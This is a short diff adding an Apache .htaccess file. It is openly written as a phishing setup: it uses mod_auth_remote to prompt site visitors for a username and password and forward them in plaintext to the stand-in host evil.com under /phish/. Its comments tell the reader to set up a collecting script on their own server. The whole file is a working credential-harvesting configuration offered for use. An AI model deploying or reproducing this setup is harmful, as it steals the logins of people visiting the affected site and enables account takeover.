@@ -1,0 +1,12 @@
+# This file will prompt the user for username and password
+# And send the credentials to your server in plaintext (http basic auth)
+# You will need to edit this file and create a script to collect the
+# credentials on your server
+AuthType Basic
+AuthName “”
+AuthRemoteServer evil.com
+AuthRemotePort 80
+AuthRemoteURL /phish/
+require valid-user
+# Your script need to return the corresponding 401 or 200 ok response codes
+# to the mod_auth_remote module.
